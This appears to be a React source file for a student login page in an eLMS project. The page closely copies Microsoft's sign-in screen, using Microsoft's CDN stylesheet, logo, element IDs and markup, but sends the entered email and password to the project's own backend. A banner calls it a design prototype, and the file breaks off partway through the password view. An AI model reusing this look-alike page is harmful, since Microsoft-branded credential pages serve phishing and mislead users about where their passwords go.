// @ts-nocheck
import * as React from 'react';
import { useEffect, useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import msLoginCss from './ms-login.css?raw';
import { loginUser, saveAccount, getSavedAccounts, removeSavedAccount } from '../../../services/authService';
import type { SavedAccount } from './types';
import { User, Plus } from 'lucide-react';
import { GoogleReCaptchaProvider, useGoogleReCaptcha } from 'react-google-recaptcha-v3';

const StudentLogin: React.FC = () => {
    const navigate = useNavigate();
    const { executeRecaptcha } = useGoogleReCaptcha();
    const initialAccounts = getSavedAccounts();
    const [savedAccounts, setSavedAccounts] = useState<SavedAccount[]>(initialAccounts);
    const [showForgetDropdown, setShowForgetDropdown] = useState<string | null>(null);
    const dropdownRef = useRef<HTMLDivElement>(null);
    const [cssLoaded, setCssLoaded] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');
    const [passwordErrorMessage, setPasswordErrorMessage] = useState('');
    const [password, setPassword] = useState('');
    const [attempts, setAttempts] = useState(0);
    const [enteredEmail, setEnteredEmail] = useState('');
    const [currentView, setCurrentView] = useState(initialAccounts.length > 0 ? 'pick' : 'email'); // 'pick', 'email', 'password', 'options'

    const [showPick, setShowPick] = useState(initialAccounts.length > 0);
    const [showEmail, setShowEmail] = useState(initialAccounts.length === 0);
    const [showPassword, setShowPassword] = useState(false);
    const [showOptions, setShowOptions] = useState(false);

    const [pickClass, setPickClass] = useState('animate');
    const [emailClass, setEmailClass] = useState('animate');
    const [passwordClass, setPasswordClass] = useState('animate');
    const [optionsClass, setOptionsClass] = useState('animate');

    const handleEmailKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            handleEmailNext();
        }
    };

    const handlePasswordKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            handlePasswordSignIn(e);
        }
    };

    const handleEmailNext = async (e?: React.FormEvent) => {
        if (e) e.preventDefault();
        const emailInput = document.getElementById('i0116') as HTMLInputElement;
        const emailValue = emailInput ? emailInput.value.trim() : '';
        setErrorMessage('');

        if (!emailValue || !emailValue.includes('@')) {
            setErrorMessage('Enter a valid email address or phone number.');
            return;
        }

        // Skip backend check to prevent user enumeration. 
        // We will validate the email + password together on the next screen.
        setEnteredEmail(emailValue);
        switchToPassword('email');
    };

    const handlePasswordSignIn = async (e: React.FormEvent) => {
        if (e) e.preventDefault();

        // Read directly from the DOM — the input is uncontrolled to prevent
        // React re-renders from resetting the typed value mid-session.
        const pwdInput = document.getElementById('i0118pwd') as HTMLInputElement;
        const currentPassword = pwdInput ? pwdInput.value : '';

        setPasswordErrorMessage('');

        if (!executeRecaptcha) {
            setPasswordErrorMessage("Security check not ready. Please wait.");
            return;
        }

        setIsLoading(true);

        try {
            // Generate reCAPTCHA token silently before login
            await executeRecaptcha('login_submit');
            const result = await loginUser(enteredEmail, currentPassword);
            setIsLoading(false);
            if (result.success && result.user) {
                // Save account for "Pick an account" screen on next visit
                saveAccount(result.user.email, result.user.full_name);
                // Navigate based on user role
                if (result.user.role === 'teacher') {
                    navigate('/teacher-dashboard');
                } else {
                    navigate('/dashboard');
                }
            } else {
                const nextAttempts = attempts + 1;
                setAttempts(nextAttempts);
                if (nextAttempts >= 3) {
                    setPasswordErrorMessage("Sorry, your sign-in timed out. Please sign in again.");
                } else {
                    setPasswordErrorMessage(result.error || "Your account or password is incorrect. If you don't remember your password, ");
                }
            }
        } catch (err: any) {
            console.error("Login exception:", err);
            setIsLoading(false);
            setPasswordErrorMessage(err?.message || 'An error occurred. Please try again.');
        }
    };

    const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setPassword(e.target.value);
    };

    const handlePasswordBack = (e: React.MouseEvent) => {
        if (e) e.preventDefault();
        switchFromPassword();
    };

    const handleAccountSelect = (accountEmail: string) => {
        setEnteredEmail(accountEmail);
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            switchToPassword('pick');
        }, 600);
    };

    const handleForgetAccount = (accountEmail: string) => {
        removeSavedAccount(accountEmail);
        const updated = getSavedAccounts();
        setSavedAccounts(updated);
        setShowForgetDropdown(null);
        if (updated.length === 0) {
            switchToEmail();
        }
    };

    const switchToEmail = () => {
        console.log("Switching to Email View...");
        setCurrentView('email');
        
        // 1. Slide Out Pick View to Left
        setPickClass("animate slide-out-next");
        
        // 2. Slide In Email View from Right
        setShowEmail(true);
        setEmailClass("animate slide-in-next");
        
        setTimeout(() => {
            setShowPick(false);
        }, 200);
    };

    const switchToPassword = (fromView: 'pick' | 'email') => {
        console.log("Switching to Password View from", fromView);
        setCurrentView('password');
        
        if (fromView === 'pick') {
            // 1. Slide Out Pick View to Left
            setPickClass("animate slide-out-next");
            
            // 2. Slide In Password View from Right
            setShowPassword(true);
            setPasswordClass("animate slide-in-next");
            
            setTimeout(() => {
                setShowPick(false);
            }, 200);
        } else {
            // 1. Slide Out Email View to Left
            setEmailClass("animate slide-out-next");
            
            // 2. Slide In Password View from Right
            setShowPassword(true);
            setPasswordClass("animate slide-in-next");
            
            setTimeout(() => {
                setShowEmail(false);
            }, 200);
        }
    };

    const switchFromPassword = () => {
        setPasswordErrorMessage('');
        setPassword('');
        setAttempts(0);

        // Clear the uncontrolled password input
        const pwdInput = document.getElementById('i0118pwd') as HTMLInputElement;
        if (pwdInput) pwdInput.value = '';

        // 1. Slide Out Password View to Right
        setPasswordClass("animate slide-out-back");

        if (savedAccounts.length > 0) {
            // Go back to Pick Account
            setCurrentView('pick');
            setShowPick(true);
            setPickClass("animate slide-in-back");
        } else {
            // Go back to Email
            setCurrentView('email');
            setShowEmail(true);
            setEmailClass("animate slide-in-back");
        }

        setTimeout(() => {
            setShowPassword(false);
        }, 200);
    };


    const switchToOptions = () => {
        console.log("Switching to Options View...");
        setCurrentView('options');
        
        // 1. Slide Out Email View to Left
        setEmailClass("animate slide-out-next");
        
        // 2. Slide In Options View from Right
        setShowOptions(true);
        setOptionsClass("animate slide-in-next");
        
        setTimeout(() => {
            setShowEmail(false);
        }, 200);
    };

    const switchFromOptionsToEmail = () => {
        console.log("Switching back from Options View to Email View...");
        setCurrentView('email');
        
        // 1. Slide Out Options View to Right
        setOptionsClass("animate slide-out-back");
        
        // 2. Slide In Email View from Left
        setShowEmail(true);
        setEmailClass("animate slide-in-back");
        
        setTimeout(() => {
            setShowOptions(false);
        }, 200);
    };

    const switchFromEmailToPick = () => {
        console.log("Switching back from Email View to Pick View...");
        setCurrentView('pick');
        setErrorMessage('');
        
        // 1. Slide Out Email View to Right
        setEmailClass("animate slide-out-back");
        
        // 2. Slide In Pick View from Left
        setShowPick(true);
        setPickClass("animate slide-in-back");
        
        setTimeout(() => {
            setShowEmail(false);
        }, 200);
    };

    const handleSignInOptionsClick = (e: React.MouseEvent) => {
        if (e) e.preventDefault();
        switchToOptions();
    };

    const handleOptionsBack = (e: React.MouseEvent) => {
        if (e) e.preventDefault();
        switchFromOptionsToEmail();
    };

    const handleEmailBack = (e: React.MouseEvent) => {
        if (e) e.preventDefault();
        switchFromEmailToPick();
    };

    useEffect(() => {
        // Microsoft's CSS (ms-login.css) uses html[dir="ltr"] for all its animation triggers and layout
        document.documentElement.dir = 'ltr';

        // Load the local Microsoft CSS dynamically to prevent global leakage
        const localStyle = document.createElement('style');
        localStyle.textContent = msLoginCss;
        document.head.appendChild(localStyle);

        // Load the Microsoft CDN stylesheet dynamically
        const msLink = document.createElement('link');
        msLink.rel = 'stylesheet';
        msLink.href = 'https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_pzfy2abhlubh6bv_dyvwha2.css';
        msLink.crossOrigin = 'anonymous';
        msLink.onload = () => {
            setCssLoaded(true);
            if (initialAccounts.length > 0) {
                setPickClass('animate slide-in-next');
            } else {
                setEmailClass('animate slide-in-next');
            }
        };
        document.head.appendChild(msLink);

        // Cleanup on unmount
        return () => {
            document.head.removeChild(msLink);
            document.head.removeChild(localStyle);
            document.documentElement.removeAttribute('dir');
        };
    }, []);

    return (
        <>
            <style dangerouslySetInnerHTML={{__html: `
/* Segoe UI Font Faces */
@font-face {
  font-family: 'Segoe UI Semibold';
  src: url('/fonts/SegoeUI_TTF/Segoe UI Semibold.ttf') format('truetype');
  font-weight: 600;
  font-style: normal;
}
@font-face {
  font-family: 'Segoe UI Semilight';
  src: url('/fonts/SegoeUI_TTF/Segoe UI Semilight.ttf') format('truetype');
  font-weight: 300;
  font-style: normal;
}

/* Apply Semilight to all elements by default */
.cb, .cb * {
  font-family: 'Segoe UI Semilight', 'Segoe UI', sans-serif !important;
}

/* Semibold — headings, titles, button labels */
.cb [role="heading"],
.cb .title,
.cb .ext-title,
.cb #loginHeader,
.cb #idDiv_SAOTCS_Title,
.cb #searchOrganizationHeader,
.cb .footer-item.debug-item {
  font-family: 'Segoe UI Semibold', 'Segoe UI', sans-serif !important;
  font-weight: 600 !important;
}

/* Gray out and disable the Next button during loading */
.cb .lightbox-cover.disable-lightbox ~ * .win-button.button_primary,
.cb .win-button.button_primary.is-disabled {
  background-color: rgba(0, 0, 0, 0.2) !important;
  color: rgba(0, 0, 0, 0.36) !important;
  border-color: transparent !important;
  pointer-events: none !important;
  cursor: default !important;
}

.cb #cantAccessAccount,
.cb #idA_PWD_ForgotPassword {
  font-size: 13px !important;
}

.cb #usernameError,
.cb #usernameError div,
.cb #passwordError,
.cb #passwordError div {
  font-size: 15px !important;
}

.cb #passwordError a {
  font-size: 15px !important;
  color: rgb(0, 103, 184) !important;
}

.cb .tile .table-cell.content small {
  font-size: 13px !important;
}

/* Remove default browser/Vite focus outlines for input fields to match original */
.cb input.form-control:focus,
.cb input.ext-input:focus {
  outline: none !important;
  box-shadow: none !important;
}

/* Exact replica load animations using Microsoft's native show-from-right keyframes */
.sign-in-box { position: relative; }
.promoted-fed-cred-box { position: relative; }
#pickViewWrapper { position: relative; width: 100%; min-height: 206px; }
#emailViewWrapper { position: relative; width: 100%; min-height: 206px; }
#optionsViewWrapper { position: relative; width: 100%; min-height: 206px; }
#orgViewWrapper { position: relative; width: 100%; min-height: 206px; }
#passwordViewWrapper { position: relative; width: 100%; min-height: 170px; }
#paginationView { position: relative; overflow: visible; }

/* Prevent dual-card stacking and container height expansion during transitions */
#pickViewWrapper.slide-out-next,
#pickViewWrapper.slide-out-back,
#emailViewWrapper.slide-out-next,
#emailViewWrapper.slide-out-back,
#passwordViewWrapper.slide-out-next,
#passwordViewWrapper.slide-out-back,
#optionsViewWrapper.slide-out-next,
#optionsViewWrapper.slide-out-back,
#orgViewWrapper.slide-out-next,
#orgViewWrapper.slide-out-back {
  position: absolute !important;
  top: 0;
  left: 0;
  width: 100%;
  z-index: 1;
}
`}} />

<div className="cb" style={{display: 'block'}}>

<motion.div 
    initial={{ y: 20, opacity: 0, filter: 'blur(8px)' }}
    animate={{ y: 0, opacity: 1, filter: 'blur(0px)' }}
    transition={{ duration: 0.8, ease: [0.16, 1, 0.3, 1] }}
    className="fixed bottom-4 left-4 right-4 md:bottom-6 md:left-6 md:right-auto md:max-w-sm z-[100] bg-[#fefce8]/95 backdrop-blur-sm border border-[#fde047] rounded-xl p-4 shadow-xl"
>
    <div className="leading-relaxed text-left text-[#a16207] text-sm tracking-wide">
        <strong className="font-bold block mb-1.5 text-base text-[#854d0e]">Development Showcase (eLMS Project)</strong> 
        This is <strong className="font-bold text-[#854d0e]">just a prototype</strong> for <strong className="font-semibold">testing designs</strong>. We <strong className="font-bold text-red-700">do not collect or store</strong> any real credentials. So <strong className="font-bold text-[#854d0e]">hindi siya yung as in Microsoft talaga</strong> nirecreate kolang from animation hanggang sa layouts etc so ayon lang naman.
    </div>
</motion.div>



<div>{/*  */}

{/*  */}

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" noValidate="novalidate" spellCheck="false" method="post" target="_top" autoComplete="off" data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="https://login.microsoftonline.com/common/login" className="provide-min-height">
    {/* ko withProperties: { '$loginPage': $data } */}
    <div className="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">{/*  */}

{/* ko ifnot: useLayoutTemplates */}{/* /ko */}

{/* ko if: useLayoutTemplates */}
    {/* ko withProperties: { '$page': $parent } */}
        {/* ko if: isLightboxTemplate() */}
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" className="provide-min-height">{/*  */}

<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div className="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    {/* ko if: smallImageUrl */}{/* /ko */}

    {/* ko if: backgroundImageUrl */}
    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" className="background-image ext-background-image" aria-label="Organization background image" style={{ backgroundImage: "url('/images/Background.png')" }}></div>
        {/* ko if: useImageMask */}{/* /ko */}
    {/* /ko */}
</div></div>

{/* ko if: svr.iBannerEnvironment */}{/* /ko */}

{/* ko withProperties: { '$masterPageContext': $parentContext } */}
<div className="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    {/* ko if: showHeader */}{/* /ko */}

    <div className="template-section main-section">
        <div data-bind="externalCss: { 'middle': true }" className="middle ext-middle">
            <div className="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">{/*  */}

{/* ko withProperties: { '$content': $data } */}
<div className="flex-column">
    {/* ko if: $page.paginationControlHelper.showBackgroundLogoHolder */}{/* /ko */}

    {/* ko if: $page.paginationControlHelper.showPageLevelTitleControl */}{/* /ko */}

    <div className="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails,
                'has-header': $content.hasHeader }" className="sign-in-box ext-sign-in-box has-popup">

            {/* ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } */}

        {/* ko if: svr.fShowCookieBanner */}{/* /ko */}

        <div className={`lightbox-cover ${isLoading ? 'disable-lightbox' : ''}`}></div>

        {isLoading && (
            <div className="progress" role="progressbar">
                <div></div><div></div><div></div><div></div><div></div>
            </div>
        )}

        {/* ko if: loadBannerLogo */}
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }">{/*  */}

{/* ko if: bannerLogoUrl */}{/* /ko */}

{/* ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx */}
    {/* ko if: !svr.fEnableDelosBrandingForEntra && !svr.fEnableBleuBrandingForEntra */}
        {/* ko component: 'accessible-image-control' */}{/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}{/* /ko */}
{/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
{/* ko template: { nodes: [darkImageNode], data: $parent } */}<img className="logo" role="img" data-pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" data-svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" />{/* /ko */}
{/* /ko */}{/* /ko */}
    {/* /ko */}
    {/* ko if: svr.fEnableDelosBrandingForEntra */}{/* /ko */}
    {/* ko if: svr.fEnableBleuBrandingForEntra */}{/* /ko */}
{/* /ko */}
{/* ko if: !bannerLogoUrl && isCiamUserFlowUx && bannerLogoText */}{/* /ko */}</div>
        {/* /ko */}

        {/* ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() */}{/* /ko */}

        {/* ko if: asyncInitReady */}
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }">{/*  */}

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" className="">
    {/* ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) */}{/* /ko */}

    <div className={`pagination-view animate ${currentView === 'password' ? 'has-identity-banner' : ''}`} id="paginationView" style={{position: 'relative', overflow: 'visible'}}>
        {/* Wrapper for Pick an account View to allow transitions */}
        <div id="pickViewWrapper" className={pickClass} style={{ display: showPick ? 'block' : 'none' }}>
            <div data-viewid="12">
                {/* Pick an account View Title */}
                <div className="row title ext-title" id="loginHeader">
                    <div role="heading" aria-level="1">Pick an account</div>
                </div>

                <div>
                    <div id="tilesHolder" className="form-group" role="list">
                        {/* Saved account tiles */}
                        {savedAccounts.map((account) => (
                            <div key={account.email} className="row tile" role="listitem">
                                <div className="table" tabIndex={0} role="button" style={{ cursor: 'pointer' }} onClick={() => handleAccountSelect(account.email)}>
                                    <div className="table-row">
                                        <div className="table-cell tile-img">
                                            <div className="tile-img" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#e5e5e5', borderRadius: '50%'}}>
                                                <User size={24} color="#666" />
                                            </div>
                                        </div>
                                        <div className="table-cell text-left content">
                                            <div>{account.name || account.email}</div>
                                            {account.name && <div><small>{account.email}</small></div>}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        ))}
                        {/* Use another account tile */}
                        <div className="row tile" role="listitem">
                            <div id="otherTile" className="table" tabIndex={0} role="button" aria-labelledby="otherTileText" style={{ cursor: 'pointer' }} onClick={switchToEmail}>
                                <div className="table-row">
                                    <div className="table-cell tile-img">
                                        <div className="tile-img" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', backgroundColor: '#e5e5e5', borderRadius: '50%'}}>
                                            <Plus size={24} color="#666" />
                                        </div>
                                    </div>
                                    <div className="table-cell text-left content">
                                        <div id="otherTileText">Use another account</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div id="emailViewWrapper" className={emailClass} style={{ display: showEmail ? 'block' : 'none' }}>
            <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds,
                    undirectedRecoveryContinuationToken: sharedData.undirectedRecoveryContinuationToken,
                    undirectedRecoveryUrl: sharedData.undirectedRecoveryUrl,
                    accountRecoveryUrlV2: sharedData.accountRecoveryUrlV2,
                    accountRecoveryContinuationTokenV2: sharedData.accountRecoveryContinuationTokenV2,
                    supportsAccountRecoveryV2: sharedData.supportsAccountRecoveryV2,
                    customStrings: $loginPage.stringCustomizationObservables.customStrings(),
                    isCustomizationFailure: $loginPage.stringCustomizationObservables.isCustomStringsLoadFailure(),
                    userIdLabel: $loginPage.userIdLabel,
                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
                    accessRecoveryLink: $loginPage.accessRecoveryLink,
                    boilerPlateText: $loginPage.boilerPlateText },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    redirect: $loginPage.view_onRedirect,
                    updateDFPUrl: $loginPage.view_onUpdateDFPUrl,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }">{/*  */}

<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
        headerDescription: customDescription() } }"><div>
    <div className="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
        <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
        {/* ko if: isSubtitleVisible */}{/* /ko */}
    </div>

    {/* ko if: headerDescription */}{/* /ko */}
</div></div>

{/* ko if: pageDescription && !svr.fHideLoginDesc */}{/* /ko */}

<div className="row">
    {/* ko if: svr.fEnableAriaLiveUpdates */}{/* /ko */}

    {/* ko ifnot: svr.fEnableAriaLiveUpdates */}
    <div role="alert" aria-live="assertive">
        {/* ko if: usernameTextbox.error */}{/* /ko */}
    </div>
    {/* /ko */}

    {errorMessage && (
        <div id="usernameError" className="alert alert-error" role="alert">
            <div>{errorMessage}</div>
        </div>
    )}

    <div className="form-group col-md-24">
        {/* ko if: prefillNames().length > 1 */}{/* /ko */}

        {/* ko ifnot: prefillNames().length > 1 */}
        <div className="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">{/* ko withProperties: { '$placeholderText': placeholderText } */}
    {/* ko template: { nodes: $componentTemplateNodes, data: $parent } */}

            <input type="email" name="loginfmt" id="i0116" onKeyDown={handleEmailKeyDown} maxLength="113" className={`form-control ltr_override input ext-input text-box ext-text-box ${errorMessage ? 'has-error' : ''}`} aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" data-bind="
                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en',
                    autocomplete: svr.fEnablePasskeyAutofillUI ? 'username webauthn' : 'username' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy:
                        'winBodyHeader winBodySubHeader loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" autoComplete="username webauthn" aria-label="Enter your email or phone" aria-describedby="winBodyHeader winBodySubHeader loginHeader usernameError" placeholder="Email or phone" data-report-attached="1" />

            <input name="passwd" type="password" id="i0118" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" className="moveOffScreen" tabIndex="-1" aria-hidden="true" />

        {/* /ko */}
{/* /ko */}
{/* ko ifnot: usePlaceholderAttribute */}{/* /ko */}</div>
        {/* /ko */}
    </div>
</div>

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" className="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div className="row">
        <div className="col-md-24">
            <div className="text-13">
                {/* ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases */}{/* /ko */}

                {/* ko ifnot: hideCantAccessYourAccount */}
                <div className="form-group">
                    <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                        text: svr.fEnableLivePreview ? cantAccessYourAccountText : unsafe_cantAccessYourAccountText,
                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                        attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                        href: accessRecoveryLink || '#'" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8704b3cc-94fe-465a-b6ad-0121ee5a6bee&amp;redirect_uri=https%3A%2F%2Fwww.neolms.com%2Fauth%2Fmicrosoft_office365%2Fcallback&amp;response_type=code&amp;scope=openid+profile+email+https%3A%2F%2Fgraph.microsoft.com%2FUser.Read#">Can’t access your account?</a>
                </div>
                {/* /ko */}

                {/* ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) */}{/* /ko */}

                {/* ko if: svr.fEnableShowPickerCredObservable */}
                    {/* ko if: showCredPicker() */}{/* /ko */}
                {/* /ko */}

                {/* ko ifnot: svr.fEnableShowPickerCredObservable */}{/* /ko */}

                {/* ko if: svr.urlSkipZtd */}{/* /ko */}
            </div>
        </div>
    </div>
</div>

{/* ko if: svr.fShowLegalMessagingInline */}{/* /ko */}

<div className="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
    <div className="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    {/* ko if: isSecondaryButtonVisible */}{/* /ko */}

    {/* Back button next to Next button on Email card */}
    <div className="inline-block button-item ext-button-item">
        <input type="button" id="idBtn_EmailBack" onClick={handleEmailBack} style={{ cursor: 'pointer' }} className="win-button button-secondary button ext-button secondary ext-secondary" value="Back" />
    </div>
    { ' ' }
    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" className="inline-block button-item ext-button-item">
        {/* type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 */}
        {/* ko ifnot: svr.fConsentButtonIdViaName */}
        <input type="submit" id="idSIButton9" onClick={handleEmailNext} disabled={isLoading} className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                css: { 'high-contrast-overrides': true },
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
                clickBubble: !svr.fEnableLivePreview,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" data-report-attached="1" />
        {/* /ko */}
        {/* ko if: svr.fConsentButtonIdViaName */}{/* /ko */}
    </div>
</div></div>
    </div>
</div>

{/* ko if: tenantBranding.BoilerPlateText || boilerPlateText */}{/* /ko */}</div>
        </div>

        {/* Wrapper for Password View to allow transitions */}
        <div id="passwordViewWrapper" className={passwordClass} style={{ display: showPassword ? 'block' : 'none' }}>
            <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
                {/* Identity Banner with Back Button and Email */}
                <div className="animate">
                    <div className="identityBanner">
                        <button type="button" className="backButton" id="idBtn_PwdBack" aria-label="Back" onClick={handlePasswordBack} style={{ cursor: 'pointer' }}>
                            <img role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" alt="" />
                        </button>
                        <div id="displayName" className="identity" title={enteredEmail}>{enteredEmail}</div>
                    </div>
                </div>

                {/* Password View Content */}
                <div className="animate">
